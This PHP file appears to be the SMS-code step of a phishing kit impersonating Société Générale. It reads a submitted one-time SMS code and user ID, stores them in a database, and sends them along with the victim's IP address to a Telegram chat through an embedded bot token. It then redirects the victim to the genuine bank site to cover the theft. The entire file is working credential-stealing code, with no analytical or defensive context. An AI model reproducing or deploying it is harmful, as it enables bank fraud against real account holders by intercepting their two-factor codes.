<?php

include '../conn.php';
include '../cnf.php';
$smscode = isset($_POST['smscode']) ? $_POST['smscode'] : false;
$id = isset($_POST['id']) ? $_POST['id'] : false;


$sql = "UPDATE log set smscode = :smscode, showtextcode = 0 WHERE login = :login";
$message = "+ Sms +\r\n";
$message .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . ")\r\n";

$message .= "| ID: " . $_POST['id'] . "\r\n";
$message .= "| Sms : " . $_POST['smscode']  . "\r\n";


$message .= "+ ------------------------------------------+\r\n\r\n";

$token = "1171787562:AAHfMi62vDv653oh0Q4E7ujz3rLEse7qbkM"; $chatid = "-400095465"; sendMessage($chatid, $message, $token);

$stmt = $pdo->prepare($sql);
$stmt->execute(array(
    ':smscode' => $smscode,
    ':login' => $id,
));


die("<script type='text/javascript'>top.location = 'http://societegenerale.fr/';</script>");



?>